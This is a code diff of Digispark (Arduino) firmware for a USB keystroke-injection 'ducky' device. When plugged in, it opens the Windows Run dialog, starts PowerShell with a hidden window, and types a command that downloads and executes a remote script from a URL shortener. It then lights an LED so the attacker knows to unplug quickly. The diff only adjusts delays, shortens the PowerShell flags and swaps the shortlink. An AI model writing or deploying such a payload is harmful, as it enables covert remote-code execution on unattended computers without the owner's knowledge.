@@ -4,18 +4,17 @@ void setup() { // The code goes inside setup since it should only run once.
 
   // Init LED and wait for ducky to init
   pinMode(1, OUTPUT);
-  DigiKeyboard.delay(300);
+  DigiKeyboard.delay(750);
 
   // Open a hidden Powershell window
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("powershell -W hidden");
+  DigiKeyboard.delay(150);
+  DigiKeyboard.println("powershell -W h"); // PowerShell.exe -WindowStyle Hidden
   DigiKeyboard.delay(300);
 
-  // Download the launcher for the rest of the script
-  // We use a launcher instead of typing the command since it's shorter, and like that the ducky can be removed faster. 
-  DigiKeyboard.println("iex(iwr -usebasicparsing bit.do/eSLgt)");
-  
+  // Download and run the rest of the script
+  DigiKeyboard.println("iex(iwr -useb bit.do/eSLgf)");
+
   // All done, turn on LED so you know you can unplug it
   DigiKeyboard.delay(100);
   digitalWrite(1, HIGH);
